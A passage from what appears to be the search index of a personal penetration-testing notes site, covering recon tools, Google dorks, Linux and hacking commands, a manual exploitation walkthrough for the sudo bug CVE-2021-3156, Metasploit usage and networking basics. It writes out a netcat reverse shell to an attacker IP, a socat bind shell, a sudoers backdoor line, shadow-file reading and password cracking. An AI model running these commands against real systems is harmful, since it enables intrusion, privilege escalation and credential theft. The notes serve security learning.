Identifies the technologies used on a website.</li> <li>Website: https://builtwith.com</li> <li>Why It's Useful:</li> <li>Reveals CMS, JavaScript frameworks, hosting providers.</li> <li>Identifies outdated or vulnerable software.</li> </ul>"},{"location":"igtools/#whatweb","title":"WhatWeb","text":"<ul> <li>Use Case: A Linux tool for website reconnaissance.</li> <li>Command: <code>bash   whatweb example.com</code></li> <li>Why It's Useful:</li> <li>Identifies web technologies and security configurations.</li> <li>Can detect CMS, server type, analytics tools.</li> </ul>"},{"location":"igtools/#4-https-traffic-analysis","title":"4\ufe0f HTTP/S Traffic Analysis","text":""},{"location":"igtools/#burp-suite","title":"Burp Suite","text":"<ul> <li>Use Case: Web application security testing tool.</li> <li>Capabilities:</li> <li>Intercept HTTP/S traffic between browser and server.</li> <li>Modify requests for testing vulnerabilities (e.g., SQL Injection, XSS).</li> <li>Spider and crawl websites for security flaws.</li> <li>Brute-force logins and test credentials.</li> <li>Why It's Useful:</li> <li>Essential for manual testing and deep web application security analysis.</li> </ul>"},{"location":"igtools/#5-google-dorking-google-fu","title":"5\ufe0f Google Dorking (Google-Fu)","text":"<p>Google\u2019s search operators help find sensitive information online.</p>"},{"location":"igtools/#common-google-dorks","title":"Common Google Dorks:","text":"Operator Example Use Case <code>site:</code> <code>site:example.com</code> Show results from a specific site <code>filetype:</code> <code>filetype:pdf site:example.com</code> Find PDFs on a website <code>intitle:</code> <code>intitle:\"Index of /\"</code> Look for open directories <code>inurl:</code> <code>inurl:admin login</code> Find admin panels <code>ext:</code> <code>ext:log OR ext:txt</code> Search for log or text files <code>cache:</code> <code>cache:example.com</code> View Google\u2019s cached version <code>intext:</code> <code>intext:\"Confidential\" site:example.com</code> Search for keywords on a site"},{"location":"igtools/#6-additional-reconnaissance-tools","title":"6\ufe0f Additional Reconnaissance Tools","text":""},{"location":"igtools/#tomnomnoms-tools","title":"TomNomNom\u2019s Tools","text":"<p>TomNomNom is a security researcher who has created powerful recon tools: - <code>assetfinder</code> \u2192 Finds subdomains from multiple sources. - <code>httprobe</code> \u2192 Checks which found subdomains are alive. - <code>waybackurls</code> \u2192 Extracts URLs from the Wayback Machine. - Example usage: <code>bash   assetfinder example.com | httprobe</code>   - Finds subdomains and checks which are alive.</p>"},{"location":"igtools/#shodan","title":"Shodan","text":"<ul> <li>Use Case: The \u201cGoogle for hackers\u201d that scans the internet for open services.</li> <li>Website: https://www.shodan.io</li> <li>Why It's Useful:</li> <li>Finds open ports, services, cameras, and IoT devices.</li> <li>Can identify exposed industrial control systems.</li> </ul>"},{"location":"igtools/#fofa","title":"FOFA","text":"<ul> <li>Use Case: A Shodan alternative, often used by researchers.</li> <li>Website: https://fofa.info</li> <li>Why It's Useful:</li> <li>Searches for web services and leaked assets.</li> </ul>"},{"location":"igtools/#conclusion","title":"Conclusion","text":"<p>Reconnaissance is an essential phase in security assessments. Using the right tools and techniques can help gather valuable intelligence on a target. By leveraging Google Dorking, subdomain enumeration, breach lookups, and traffic analysis, professionals can uncover hidden vulnerabilities before an attack occurs.</p>"},{"location":"linux-commands/","title":"Linux Commands","text":""},{"location":"linux-commands/#basic-linux-commands","title":"Basic Linux Commands","text":""},{"location":"linux-commands/#system-information","title":"System Information","text":"<ul> <li><code>whoami</code> \u2013 Display the current user</li> <li><code>id</code> \u2013 Show user and group IDs</li> <li><code>uname -a</code> \u2013 Show system information</li> <li><code>uptime</code> \u2013 Display system uptime</li> <li><code>df -h</code> \u2013 Show disk usage</li> <li><code>du -sh *</code> \u2013 Show directory sizes</li> <li><code>free -m</code> \u2013 Show memory usage</li> <li><code>ps aux</code> \u2013 List running processes</li> <li><code>top</code> \u2013 Monitor system processes</li> <li><code>kill -9 &lt;PID&gt;</code> \u2013 Kill a process by PID</li> <li><code>crontab -l</code> \u2013 List scheduled cron jobs</li> <li><code>history</code> \u2013 Show command history</li> <li><code>echo $SHELL</code> \u2013 Show default shell</li> <li><code>lsb_release -a</code> \u2013 Show OS details</li> </ul>"},{"location":"linux-commands/#file-directory-management","title":"File &amp; Directory Management","text":"<ul> <li><code>ls -lah</code> \u2013 List files with details</li> <li><code>cd /path/to/directory</code> \u2013 Change directory</li> <li><code>pwd</code> \u2013 Print working directory</li> <li><code>mkdir newfolder</code> \u2013 Create a new folder</li> <li><code>rm -rf folder</code> \u2013 Delete a folder recursively</li> <li><code>cp file1 file2</code> \u2013 Copy files</li> <li><code>mv oldname newname</code> \u2013 Rename or move files</li> <li><code>find / -name \"*.conf\"</code> \u2013 Find config files</li> <li><code>grep -r \"password\" /etc/</code> \u2013 Search for passwords in files</li> <li><code>cat file.txt</code> \u2013 View file content</li> <li><code>less file.txt</code> \u2013 View file content with scrolling</li> </ul>"},{"location":"linux-commands/#user-permission-management","title":"User &amp; Permission Management","text":"<ul> <li><code>adduser username</code> \u2013 Add a new user</li> <li><code>passwd username</code> \u2013 Change user password</li> <li><code>su - username</code> \u2013 Switch user</li> <li><code>groups username</code> \u2013 Show user groups</li> <li><code>chmod 777 file</code> \u2013 Change file permissions</li> <li><code>chown user:group file</code> \u2013 Change file ownership</li> <li><code>sudo -l</code> \u2013 List sudo privileges</li> <li><code>visudo</code> \u2013 Edit sudoers file</li> </ul>"},{"location":"linux-commands/#networking-connectivity","title":"Networking &amp; Connectivity","text":"<ul> <li><code>ifconfig</code> or <code>ip a</code> \u2013 Show network interfaces</li> <li><code>ping -c 4 &lt;target&gt;</code> \u2013 Check host availability</li> <li><code>traceroute &lt;target&gt;</code> \u2013 Trace packet route</li> <li><code>netstat -tulnp</code> \u2013 Show open ports</li> <li><code>ss -tulnp</code> \u2013 Alternative to netstat</li> <li><code>arp -a</code> \u2013 Show ARP table</li> <li><code>nc -lvnp &lt;port&gt;</code> \u2013 Open a Netcat listener</li> <li><code>curl -I &lt;URL&gt;</code> \u2013 Get HTTP headers</li> <li><code>wget &lt;URL&gt;</code> \u2013 Download files</li> <li><code>scp user@host:/file /local/path</code> \u2013 Copy files via SSH</li> <li><code>rsync -avz user@host:/dir /local/dir</code> \u2013 Sync directories over SSH</li> </ul>"},{"location":"linux-commands/#hacking-pentesting-commands","title":"Hacking &amp; Pentesting Commands","text":""},{"location":"linux-commands/#reconnaissance-scanning","title":"Reconnaissance &amp; Scanning","text":"<ul> <li><code>nmap -sV -A &lt;target&gt;</code> \u2013 Scan open ports with service detection</li> <li><code>nmap -Pn -p- &lt;target&gt;</code> \u2013 Full port scan ignoring ping</li> <li><code>nmap --script=vuln &lt;target&gt;</code> \u2013 Scan for vulnerabilities</li> <li><code>nikto -h &lt;target&gt;</code> \u2013 Scan web servers for vulnerabilities</li> <li><code>whatweb &lt;URL&gt;</code> \u2013 Identify web technologies</li> <li><code>dnsenum &lt;domain&gt;</code> \u2013 Enumerate DNS records</li> <li><code>dig @8.8.8.8 &lt;domain&gt;</code> \u2013 Get DNS info</li> <li><code>whois &lt;domain&gt;</code> \u2013 Get domain registration details</li> <li><code>theHarvester -d &lt;domain&gt; -l 500 -b google</code> \u2013 Gather emails &amp; subdomains</li> <li><code>sublist3r -d &lt;domain&gt;</code> \u2013 Find subdomains</li> </ul>"},{"location":"linux-commands/#password-cracking-exploitation","title":"Password Cracking &amp; Exploitation","text":"<ul> <li><code>hydra -L users.txt -P passwords.txt &lt;service&gt;://&lt;target&gt;</code> \u2013 Brute-force login</li> <li><code>john --wordlist=rockyou.txt hash.txt</code> \u2013 Crack hashes with John</li> <li><code>hashcat -m 0 hash.txt rockyou.txt</code> \u2013 Crack hashes with Hashcat</li> <li><code>sqlmap -u &lt;URL&gt; --dbs</code> \u2013 Test SQL injection</li> <li><code>searchsploit &lt;keyword&gt;</code> \u2013 Find exploits in Exploit-DB</li> <li><code>msfconsole</code> \u2013 Open Metasploit Framework</li> <li><code>exploit/multi/handler</code> \u2013 Start Metasploit reverse shell listener</li> <li><code>evil-winrm -i &lt;target&gt; -u &lt;user&gt; -p &lt;password&gt;</code> \u2013 Exploit Windows via WinRM</li> <li><code>smbclient -L //&lt;target&gt;</code> \u2013 List SMB shares</li> <li><code>enum4linux -a &lt;target&gt;</code> \u2013 Enumerate Windows shares &amp; users</li> </ul>"},{"location":"linux-commands/#reverse-shell-privilege-escalation","title":"Reverse Shell &amp; Privilege Escalation","text":"<ul> <li><code>nc -e /bin/bash &lt;attacker-ip&gt; &lt;port&gt;</code> \u2013 Reverse shell (Netcat)</li> <li><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</code> \u2013 Upgrade shell to TTY</li> <li><code>echo 'user ALL=(ALL) NOPASSWD:ALL' &gt;&gt; /etc/sudoers</code> \u2013 Grant root access</li> <li><code>find / -perm -u=s -type f 2&gt;/dev/null</code> \u2013 Find SUID binaries</li> <li><code>sudo -l</code> \u2013 List sudo permissions</li> <li><code>getcap -r / 2&gt;/dev/null</code> \u2013 Find files with special capabilities</li> <li><code>linpeas.sh</code> \u2013 Automated privilege escalation scan</li> <li><code>pspy64</code> \u2013 Monitor running processes for privilege escalation</li> <li><code>gdb -q ./vulnerable</code> \u2013 Debug binaries for exploitation</li> <li><code>strings ./binary | grep password</code> \u2013 Find sensitive data in binaries</li> </ul>"},{"location":"linux-commands/#file-directory-manipulation","title":"File &amp; Directory Manipulation","text":"<ul> <li><code>tar -czf archive.tar.gz /path/to/files</code> \u2013 Compress files</li> <li><code>unzip archive.zip -d /path/to/extract/</code> \u2013 Extract files</li> <li><code>mount /dev/sdb1 /mnt/usb</code> \u2013 Mount USB drive</li> <li><code>dd if=/dev/sda of=/mnt/backup.img</code> \u2013 Create disk image</li> <li><code>cat /etc/passwd</code> \u2013 View system users</li> <li><code>cat /etc/shadow</code> \u2013 View password hashes (requires root)</li> </ul>"},{"location":"linux-commands/#miscellaneous-hacking-automation","title":"Miscellaneous Hacking &amp; Automation","text":"<ul> <li><code>socat TCP4-LISTEN:&lt;port&gt;,fork EXEC:/bin/bash</code> \u2013 Bind shell with Socat</li> <li><code>base64 -d &lt; file</code> \u2013 Decode Base64</li> <li><code>xxd -r -p hex.txt &gt; binary</code> \u2013 Convert hex to binary</li> <li><code>crunch 8 10 abc123 -o wordlist.txt</code> \u2013 Generate wordlists</li> <li><code>tmux</code> \u2013 Open a terminal multiplexer</li> <li><code>proxychains nmap -sT -Pn &lt;target&gt;</code> \u2013 Use proxies for scans</li> <li><code>torify curl &lt;URL&gt;</code> \u2013 Browse via Tor</li> <li><code>exiftool image.jpg</code> \u2013 Extract metadata from images</li> </ul>"},{"location":"linuxuserpriv/","title":"Linux - Users and Privileges","text":""},{"location":"linuxuserpriv/#understanding-file-permissions-ls-la-drwxrwxrwx","title":"Understanding File Permissions (<code>ls -la</code> &amp; <code>drwxrwxrwx</code>)","text":"<p>In Linux, file and directory permissions are fundamental for security and access control. You can view permissions using:</p> <pre><code>ls -la\n</code></pre> <p>This command lists all files, including hidden files, along with their permissions. Example output:</p> <pre><code>drwxr-xr--  3 user group 4096 Feb 8 10:00 myfolder\n-rw-r--r--  1 user group  123 Feb 8 10:01 myfile.txt\n</code></pre>"},{"location":"linuxuserpriv/#breaking-down-drwxr-xr-","title":"Breaking Down <code>drwxr-xr--</code>","text":"<p>Each file or directory has a permission structure consisting of three parts:</p> Section Represents Example First character Type (directory/file) <code>d</code> (directory), <code>-</code> (file), <code>l</code> (symlink) Next 3 (<code>rwx</code>) Owner permissions <code>r</code> (read), <code>w</code> (write), <code>x</code> (execute) Next 3 (<code>r-x</code>) Group permissions Similar to owner section Last 3 (<code>r--</code>) Others (everyone else) Similar to previous sections <p>Example: - <code>drwxr-xr--</code> \u2192 Directory (<code>d</code>), owner has full rights (<code>rwx</code>), group has read &amp; execute (<code>r-x</code>), others have read (<code>r--</code>). - <code>-rw-r--r--</code> \u2192 Regular file, readable by everyone but writable only by owner.</p>"},{"location":"linuxuserpriv/#changing-permissions-with-chmod","title":"Changing Permissions with <code>chmod</code>","text":"<p><code>chmod</code> (Change Mode) modifies file permissions.</p>"},{"location":"linuxuserpriv/#using-numeric-mode-octal-representation","title":"Using Numeric Mode (Octal Representation)","text":"<p>Each permission type corresponds to a number:</p> Permission Binary Octal Value <code>r--</code> (read) 100 4 <code>-w-</code> (write) 010 2 <code>--x</code> (execute) 001 1 <code>rwx</code> (full access) 111 7 <p>To grant full access (777) to all users:</p> <pre><code>chmod 777 myfile.txt\n</code></pre> <p>Example usage: - <code>chmod 755 script.sh</code> \u2192 Owner can read, write, execute, others can read and execute. - <code>chmod 644 document.txt</code> \u2192 Owner can read &amp; write, others can read only.</p>"},{"location":"linuxuserpriv/#using-symbolic-mode","title":"Using Symbolic Mode","text":"<p>Instead of numbers, you can use <code>u</code> (user/owner), <code>g</code> (group), <code>o</code> (others), and <code>a</code> (all).</p> <pre><code>chmod u+x script.sh  # Give execute permission to the owner\nchmod g-w file.txt   # Remove write permission from group\nchmod o+r file.txt   # Allow others to read the file\n</code></pre>"},{"location":"linuxuserpriv/#managing-users","title":"Managing Users","text":""},{"location":"linuxuserpriv/#adding-a-user","title":"Adding a User","text":"<p>To create a new user and set a password:</p> <pre><code>sudo adduser username\n</code></pre> <p>You'll be prompted to enter details such as password, full name, and optional info.</p>"},{"location":"linuxuserpriv/#viewing-users-in-linux","title":"Viewing Users in Linux","text":"<p>Linux users are stored in <code>/etc/passwd</code>:</p> <pre><code>cat /etc/passwd\n</code></pre> <p>Each user entry consists of:</p> <pre><code>username:x:1000:1000:Full Name:/home/username:/bin/bash\n</code></pre>"},{"location":"linuxuserpriv/#managing-passwords-etcshadow","title":"Managing Passwords (<code>/etc/shadow</code>)","text":"<p>Passwords are stored in <code>/etc/shadow</code> in hashed format:</p> <pre><code>sudo cat /etc/shadow\n</code></pre> <p>To crack password hashes, tools like John the Ripper can be used:</p> <pre><code>john --wordlist=rockyou.txt hashfile.txt\n</code></pre>"},{"location":"linuxuserpriv/#switching-users-running-commands-as-another-user","title":"Switching Users &amp; Running Commands as Another User","text":""},{"location":"linuxuserpriv/#switching-users-su-sudo","title":"**Switching Users (<code>su</code> &amp; <code>sudo</code>)","text":"<ul> <li><code>su username</code> \u2192 Switch to another user.</li> <li><code>su - username</code> \u2192 Switch and load their environment.</li> <li><code>exit</code> \u2192 Return to the previous user.</li> </ul>"},{"location":"linuxuserpriv/#using-sudo-for-privileged-commands","title":"Using Sudo for Privileged Commands","text":"<p>Regular users cannot execute administrative commands unless they have sudo permissions. To run a command as a superuser:</p> <pre><code>sudo apt update\n</code></pre> <p>To allow a user to use <code>sudo</code>, they must be added to the sudoers file:</p> <pre><code>sudo usermod -aG sudo username\n</code></pre> <p>To manually edit sudoers (use caution!):</p> <pre><code>sudo visudo\n</code></pre>"},{"location":"linuxuserpriv/#managing-user-groups","title":"Managing User Groups","text":""},{"location":"linuxuserpriv/#viewing-groups","title":"Viewing Groups","text":"<pre><code>groups username\ncat /etc/group\n</code></pre>"},{"location":"linuxuserpriv/#creating-modifying-groups","title":"Creating &amp; Modifying Groups","text":"<ul> <li><code>sudo groupadd newgroup</code> \u2192 Create a new group.</li> <li><code>sudo usermod -aG groupname username</code> \u2192 Add user to a group.</li> <li><code>sudo gpasswd -d username groupname</code> \u2192 Remove user from a group.</li> <li><code>sudo deluser username</code> \u2192 Remove a user.</li> <li><code>sudo delgroup groupname</code> \u2192 Remove a group.</li> </ul>"},{"location":"linuxuserpriv/#useful-commands","title":"Useful Commands","text":"Command Description <code>whoami</code> Show current logged-in user <code>id</code> Show user ID and group ID <code>passwd</code> Change user password <code>finger username</code> Get user details (install package if missing) <code>last</code> Show last logged-in users <code>w</code> Show currently logged-in users <code>sudo !!</code> Run the last command with <code>sudo</code>"},{"location":"linuxuserpriv/#conclusion","title":"Conclusion","text":"<p>Understanding users, groups, and permissions is crucial for managing a Linux system securely. Using the correct permission structure, ensuring proper sudo configurations, and managing users effectively prevents unauthorized access and enhances security.</p>"},{"location":"manuexpl/","title":"Manual Exploitation Guide","text":""},{"location":"manuexpl/#introduction","title":"Introduction","text":"<p>Manual exploitation is the process of identifying, downloading, and executing exploits without using automated tools like Metasploit. This approach is useful when Metasploit does not have a suitable exploit or when testing requires manual control over execution.</p>"},{"location":"manuexpl/#finding-an-exploit","title":"Finding an Exploit","text":"<p>Before manually exploiting a target, research and obtain a working exploit.</p>"},{"location":"manuexpl/#1-searching-for-exploits-on-github","title":"1\ufe0f Searching for Exploits on GitHub","text":"<p>Many proof-of-concept (PoC) exploits are published on GitHub.</p>"},{"location":"manuexpl/#google-dork-to-search-github","title":"Google Dork to Search GitHub","text":"<pre><code>site:github.com \"&lt;service&gt; exploit\"\n</code></pre> <p>Example:</p> <pre><code>site:github.com \"OpenSSH 7.2 exploit\"\n</code></pre> <ul> <li>Look for repositories with PoC code.</li> <li>Check README files for installation and usage instructions.</li> </ul>"},{"location":"manuexpl/#using-exploit-db-searchsploit","title":"Using Exploit-DB &amp; SearchSploit","text":"<pre><code>searchsploit OpenSSH 7.2\n</code></pre> <p>If a relevant exploit is found, copy it locally:</p> <pre><code>searchsploit -m exploits/unix/remote/4091.py\n</code></pre>"},{"location":"manuexpl/#cloning-setting-up-the-exploit","title":"Cloning &amp; Setting Up the Exploit","text":"<p>Once a suitable exploit is found on GitHub, clone and set it up.</p>"},{"location":"manuexpl/#2-cloning-the-exploit-repository","title":"2\ufe0f Cloning the Exploit Repository","text":"<pre><code>git clone https://github.com/username/exploit-repo.git\n</code></pre> <p>Then, navigate into the directory:</p> <pre><code>cd exploit-repo\n</code></pre>"},{"location":"manuexpl/#3-install-dependencies","title":"3\ufe0f Install Dependencies","text":"<p>Many exploits require additional dependencies. Check the README or <code>requirements.txt</code>.</p> <pre><code>pip install -r requirements.txt\n</code></pre> <p>If using a compiled exploit (C, C++):</p> <pre><code>gcc exploit.c -o exploit\n</code></pre>"},{"location":"manuexpl/#exploiting-the-target","title":"Exploiting the Target","text":""},{"location":"manuexpl/#4-running-the-exploit","title":"4\ufe0f Running the Exploit","text":""},{"location":"manuexpl/#python-exploit-example","title":"Python Exploit Example","text":"<pre><code>python3 exploit.py --target 192.168.1.100 --port 8080\n</code></pre>"},{"location":"manuexpl/#bash-exploit-example","title":"Bash Exploit Example","text":"<pre><code>chmod +x exploit.sh\n./exploit.sh 192.168.1.100\n</code></pre>"},{"location":"manuexpl/#cc-exploit-example","title":"C/C++ Exploit Example","text":"<pre><code>./exploit 192.168.1.100\n</code></pre>"},{"location":"manuexpl/#example-manual-exploitation-of-cve-2021-3156-sudo-heap-overflow","title":"Example: Manual Exploitation of CVE-2021-3156 (Sudo Heap Overflow)","text":"<p>This vulnerability allows local privilege escalation.</p>"},{"location":"manuexpl/#1-download-the-exploit","title":"1\ufe0f Download the Exploit","text":"<pre><code>git clone https://github.com/blasty/CVE-2021-3156.git\ncd CVE-2021-3156\n</code></pre>"},{"location":"manuexpl/#2-compile-the-exploit","title":"2\ufe0f Compile the Exploit","text":"<pre><code>gcc exploit.c -o sudo_exploit\n</code></pre>"},{"location":"manuexpl/#3-run-the-exploit","title":"3\ufe0f Run the Exploit","text":"<pre><code>./sudo_exploit\n</code></pre> <ul> <li>If successful, a root shell (<code>#</code>) will be obtained.</li> </ul>"},{"location":"manuexpl/#troubleshooting-tips","title":"Troubleshooting &amp; Tips","text":""},{"location":"manuexpl/#if-the-exploit-fails","title":"If the Exploit Fails:","text":"<ol> <li>Check the Target System Version <code>bash    uname -a    cat /etc/os-release    sudo --version</code></li> <li>Try a Different Exploit Variant <code>bash    searchsploit sudo</code></li> <li>Modify the Exploit Code (Adjust hardcoded values, shellcode, offsets).</li> <li>Ensure Dependencies Are Installed (Use <code>pip</code>, <code>apt-get</code>, or <code>dnf</code>).</li> <li>Run the Exploit with Debugging (Use <code>strace</code>, <code>gdb</code>, or <code>ltrace</code>).</li> </ol>"},{"location":"manuexpl/#conclusion","title":"Conclusion","text":"<p>Manual exploitation requires careful research, correct setup, and debugging skills. Using GitHub, Exploit-DB, and SearchSploit, security testers can find and execute exploits when automated tools are unavailable.</p>"},{"location":"mkdocs-formatting-guide/","title":"Formatting Guide","text":""},{"location":"mkdocs-formatting-guide/#mkdocs-formatting-guide","title":"MkDocs Formatting Guide","text":"<p>MkDocs is a static site generator for project documentation that uses Markdown. This guide covers the essential formatting and structuring tips for writing articles in MkDocs.</p>"},{"location":"mkdocs-formatting-guide/#basic-document-structure","title":"Basic Document Structure","text":"<p>MkDocs follows a simple hierarchy using Markdown headings:</p> <pre><code># Main Title (h1)\n## Subheading (h2)\n### Section (h3)\n#### Subsection (h4)\n</code></pre> <p>Example:</p> <pre><code># My MkDocs Knowledge Base\n\n## Networking Commands\n\n### Scanning Open Ports with Nmap\n```bash\nnmap -sV -A &lt;target&gt;\n</code></pre> <pre><code>\n---\n\n## Code Blocks\n\nFor adding code snippets, use **triple backticks** (` ``` `) with the language specified:\n\n```markdown\n```bash\nls -lah\n</code></pre> <pre><code>\nThis renders as:\n\n```bash\nls -lah\n</code></pre> <p>Alternatively, you can use four-space indentation, but backticks are preferred for syntax highlighting:</p> <pre><code>    ls -lah\n</code></pre>"},{"location":"mkdocs-formatting-guide/#lists-bullet-points","title":"Lists &amp; Bullet Points","text":"<p>MkDocs supports both unordered and ordered lists:</p>"},{"location":"mkdocs-formatting-guide/#unordered-list","title":"Unordered List:","text":"<pre><code>- Item 1\n- Item 2\n  - Subitem 2.1\n  - Subitem 2.2\n</code></pre>"},{"location":"mkdocs-formatting-guide/#ordered-list","title":"Ordered List:","text":"<pre><code>1. First item\n2. Second item\n   1. Sub-item\n   2. Sub-item\n</code></pre>"},{"location":"mkdocs-formatting-guide/#links-images","title":"Links &amp; Images","text":""},{"location":"mkdocs-formatting-guide/#adding-links","title":"Adding Links:","text":"<pre><code>[OpenAI](https://openai.com)\n</code></pre> <p>This renders as: OpenAI</p>"},{"location":"mkdocs-formatting-guide/#adding-images","title":"Adding Images:","text":"<pre><code>![Alt Text](https://example.com/image.png)\n</code></pre> <p>You can also specify image width in MkDocs using custom CSS.</p>"},{"location":"mkdocs-formatting-guide/#blockquotes-callouts","title":"Blockquotes &amp; Callouts","text":"<p>Blockquotes are used for emphasizing notes or warnings:</p> <pre><code>&gt; This is a blockquote. Use it for important notes.\n</code></pre> <p>To create callouts using extensions like <code>admonition</code>:</p> <pre><code>!!! note \"Important Note\"\n    This is a highlighted note.\n</code></pre>"},{"location":"mkdocs-formatting-guide/#tables","title":"Tables","text":"<p>Tables can be created using pipes (``):</p> <pre><code>| Command  | Description       |\n|----------|-----------------|\n| `ls`     | List directory contents |\n| `pwd`    | Print working directory |\n</code></pre> <p>This renders as:</p> Command Description <code>ls</code> List directory contents <code>pwd</code> Print working directory"},{"location":"mkdocs-formatting-guide/#customizing-mkdocs","title":"Customizing MkDocs","text":""},{"location":"mkdocs-formatting-guide/#configuring-mkdocsyml","title":"Configuring <code>mkdocs.yml</code>","text":"<p>Your `` defines the navigation and settings:</p> <pre><code>site_name: My Documentation\nnav:\n  - Home: index.md\n  - Guide: guide.md\ntheme:\n  name: material\n</code></pre>"},{"location":"mkdocs-formatting-guide/#running-the-local-server","title":"Running the Local Server","text":"<p>Start the MkDocs server locally to preview changes:</p> <pre><code>mkdocs serve\n</code></pre> <p>Visit <code>http://127.0.0.1:8000/</code> in your browser.</p>"},{"location":"mkdocs-formatting-guide/#extending-mkdocs","title":"Extending MkDocs","text":""},{"location":"mkdocs-formatting-guide/#installing-plugins","title":"Installing Plugins","text":"<p>You can extend MkDocs with plugins:</p> <pre><code>pip install mkdocs-material\n</code></pre> <p>Then add it to <code>mkdocs.yml</code>:</p> <pre><code>theme:\n  name: material\n</code></pre>"},{"location":"mkdocs-formatting-guide/#conclusion","title":"Conclusion","text":"<p>This guide covers the essentials for formatting articles in MkDocs, including headings, code blocks, lists, links, images, and tables. Keep your documentation structured, readable, and well-organized!</p>"},{"location":"msfc/","title":"Metasploit - MSFConsole Guide","text":""},{"location":"msfc/#introduction","title":"Introduction","text":"<p>Metasploit is a powerful penetration testing framework that provides a variety of exploits, payloads, and auxiliary tools for security assessments. The MSFConsole is the main command-line interface for interacting with Metasploit.</p>"},{"location":"msfc/#finding-exploits","title":"Finding Exploits","text":"<p>Before using Metasploit, you can search for available exploits using SearchSploit or within MSFConsole.</p>"},{"location":"msfc/#using-searchsploit-offline-exploit-database","title":"Using SearchSploit (Offline Exploit Database)","text":"<pre><code>searchsploit &lt;query&gt;\n</code></pre> <ul> <li>Looks up exploits from Exploit-DB.</li> <li>Example:   <code>bash   searchsploit Apache 2.4</code></li> </ul>"},{"location":"msfc/#using-msfconsole-to-search-for-exploits","title":"Using MSFConsole to Search for Exploits","text":"<pre><code>msfconsole\nsearch &lt;query&gt;\n</code></pre> <ul> <li>Example:   <code>bash   search vsftpd</code></li> <li>This will return all matching exploits, auxiliary modules, and payloads.</li> </ul>"},{"location":"msfc/#using-an-exploit","title":"Using an Exploit","text":"<p>Once an exploit is found, load it into the console.</p>"},{"location":"msfc/#select-an-exploit","title":"Select an Exploit","text":"<pre><code>use &lt;exploit_name&gt;\n</code></pre> <ul> <li>Example:   <code>bash   use exploit/unix/ftp/vsftpd_234_backdoor</code></li> </ul>"},{"location":"msfc/#checking-available-options","title":"Checking Available Options","text":"<pre><code>options\n</code></pre> <ul> <li>Displays required parameters (e.g., RHOSTS, LPORT, PAYLOAD).</li> </ul>"},{"location":"msfc/#setting-target-payload","title":"Setting Target &amp; Payload","text":""},{"location":"msfc/#set-the-target-ip-address","title":"Set the Target IP Address","text":"<pre><code>set RHOSTS &lt;target_ip&gt;\n</code></pre> <ul> <li>Example:   <code>bash   set RHOSTS 192.168.1.100</code></li> </ul>"},{"location":"msfc/#confirm-current-options","title":"Confirm Current Options","text":"<pre><code>options\n</code></pre> <ul> <li>Verify if required parameters are properly configured.</li> </ul>"},{"location":"msfc/#check-available-targets","title":"Check Available Targets","text":"<pre><code>show targets\n</code></pre> <ul> <li>Lists supported OS and versions for the exploit.</li> </ul>"},{"location":"msfc/#run-the-exploit","title":"Run the Exploit","text":"<pre><code>run\n</code></pre> <ul> <li>Attempts to execute the exploit on the target system.</li> </ul>"},{"location":"msfc/#troubleshooting-if-the-exploit-fails","title":"Troubleshooting: If the Exploit Fails","text":"<p>Sometimes, an exploit may fail or crash unexpectedly. Try the following steps:</p> <ol> <li>Check Available Options Again <code>bash    options</code></li> <li> <p>This may display additional parameters required.</p> </li> <li> <p>Change the Payload <code>bash    set payload &lt;query&gt;</code></p> </li> <li> <p>Example:      <code>bash      set payload linux/x86/meterpreter/reverse_tcp</code></p> </li> <li> <p>Confirm Payload Works <code>bash    options</code></p> </li> <li> <p>Ensure the new payload settings are applied correctly.</p> </li> <li> <p>Run the Exploit Again <code>bash    run</code></p> </li> </ol>"},{"location":"msfc/#conclusion","title":"Conclusion","text":"<p>Metasploit is an essential tool for penetration testing, and understanding how to search, configure, and troubleshoot exploits is key. If an exploit fails, experiment with different payloads and configurations to improve success rates.</p>"},{"location":"networking/","title":"Networking Basics","text":""},{"location":"networking/#ip-addressing-layer-3-network-layer","title":"IP Addressing (Layer 3 - Network Layer)","text":"<p>An IP address is a unique identifier assigned to each device on a network, allowing communication between devices. IP operates at Layer 3 (Network Layer) of the OSI model.</p>"},{"location":"networking/#ipv4","title":"IPv4","text":"<ul> <li>32-bit address space \u2192 Supports 2\u00b3\u00b2 (~4.2 billion) unique addresses.</li> <li>Address format: <code>xxx.xxx.xxx.xxx</code> (four octets, each 8 bits).</li> <li>Due to address exhaustion, IPv4 requires techniques like NAT (Network Address Translation).</li> </ul>"},{"location":"networking/#ipv6","title":"IPv6","text":"<ul> <li>128-bit address space \u2192 Supports 2\u00b9\u00b2\u2078 addresses (virtually unlimited).</li> <li>Address format: <code>xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx</code> (hexadecimal).</li> <li>Designed to replace IPv4, but adoption is ongoing.</li> </ul>"},{"location":"networking/#why-are-we-still-using-ipv4","title":"Why Are We Still Using IPv4?","text":"<p>Due to address exhaustion, NAT (Network Address Translation) allows multiple devices in a private network to share a single public IPv4 address. This helps extend the usability of IPv4.</p>"},{"location":"networking/#private-ipv4-address-ranges","title":"Private IPv4 Address Ranges","text":"<p>IPv4 addresses are categorized into different classes, with specific private IP ranges:</p> Class Address Range Number of Hosts A <code>10.0.0.0 \u2013 10.255.255.255</code> 16 million B <code>172.16.0.0 \u2013 172.31.255.255</code> 65,000 C <code>192.168.0.0 \u2013 192.168.255.255</code> 254 <p>These private addresses cannot be routed on the public internet and require NAT for external communication.</p>"},{"location":"networking/#mac-addressing-layer-2-data-link-layer","title":"MAC Addressing (Layer 2 - Data Link Layer)","text":"<p>A MAC address (Media Access Control address) is a 48-bit unique identifier assigned to network interfaces and operates at Layer 2 (Data Link Layer) of the OSI model.</p> <ul> <li>Format: <code>XX:XX:XX:XX:XX:XX</code> (six pairs of hexadecimal digits).</li> <li>The first three pairs (OUI - Organizationally Unique Identifier) identify the manufacturer.</li> <li>You can look up MAC addresses using online databases.</li> </ul>"},{"location":"networking/#tcp-vs-udp-layer-4-transport-layer","title":"TCP vs. UDP (Layer 4 - Transport Layer)","text":""},{"location":"networking/#tcp-transmission-control-protocol","title":"TCP (Transmission Control Protocol)","text":"<ul> <li>Connection-oriented protocol (ensures reliable communication).</li> <li>Uses a 3-way handshake to establish a connection:</li> <li>SYN \u2192 Client sends a request to initiate communication.</li> <li>SYN-ACK \u2192 Server acknowledges the request.</li> <li>ACK \u2192 Client confirms the connection is established.</li> <li>Use case: Web browsing (HTTP/HTTPS), emails (SMTP/IMAP/POP3), file transfers (FTP).</li> </ul>"},{"location":"networking/#udp-user-datagram-protocol","title":"UDP (User Datagram Protocol)","text":"<ul> <li>Connectionless protocol (faster but unreliable).</li> <li>No handshake; packets are sent without guarantee of 